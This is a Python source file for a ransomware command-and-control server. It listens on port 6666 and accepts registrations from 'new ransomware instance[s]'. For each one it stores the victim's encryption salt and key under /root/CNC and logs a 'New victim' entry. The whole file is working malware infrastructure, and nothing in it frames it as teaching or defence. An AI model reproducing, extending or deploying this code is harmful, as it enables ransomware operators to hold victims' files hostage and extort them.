import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import logging

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"
    
    def save_b64(self, token:str, data:str, filename:str):
        # decode base64 token
        token = base64.b64decode(token)  
        # convert token to hex and then to string
        token =str(token.hex())

        # create the path
        path=os.path.join(CNC.ROOT_PATH, token)
        
        #create the directory if it does not exist
        if not os.path.exists(path):
            os.mkdir(path)

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        
        try: 
            #retrieve the salt, key and token
            salt = body["salt"]
            key = body["key"]
            token = body["token"]

            #save the salt and key
            self.save_b64(token, salt, "salt.bin")
            self.save_b64(token, key, "key.bin")
            
            #display  the key in base64 
            self.log_message(f"New victim: {token} , salt : {salt}, key :  {key}")

            #return a success message
            return {"status": "ok"}
        except Exception as e:
            self.log_message(f"Error: {e}")
            return {"status": "error"}
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()